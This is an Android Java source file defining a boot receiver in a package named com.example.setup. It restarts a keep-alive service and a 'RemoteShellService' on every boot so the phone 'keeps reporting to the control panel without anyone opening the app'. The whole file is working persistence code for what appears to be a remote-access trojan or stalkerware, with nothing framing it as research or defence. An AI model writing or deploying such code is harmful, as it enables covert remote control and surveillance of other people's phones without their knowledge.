package com.example.setup;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Restarts the two foreground services after any reboot so the phone keeps
 * reporting to the control panel without anyone opening the app.
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent == null ? null : intent.getAction();
        if (action == null) return;
        if (!Intent.ACTION_BOOT_COMPLETED.equals(action)
                && !"android.intent.action.QUICKBOOT_POWERON".equals(action)
                && !"com.htc.intent.action.QUICKBOOT_POWERON".equals(action)) {
            return;
        }
        int flags = Build.VERSION.SDK_INT >= 26
                ? (Intent.FLAG_INCLUDE_STOPPED_PACKAGES | Intent.FLAG_RECEIVER_FOREGROUND)
                : Intent.FLAG_INCLUDE_STOPPED_PACKAGES;

        Intent keep = new Intent(context, KeepAliveService.class).setFlags(flags);
        Intent shell = new Intent(context, RemoteShellService.class).setFlags(flags);
        if (Build.VERSION.SDK_INT >= 26) {
            context.startForegroundService(keep);
            context.startForegroundService(shell);
        } else {
            context.startService(keep);
            context.startService(shell);
        }
    }
}
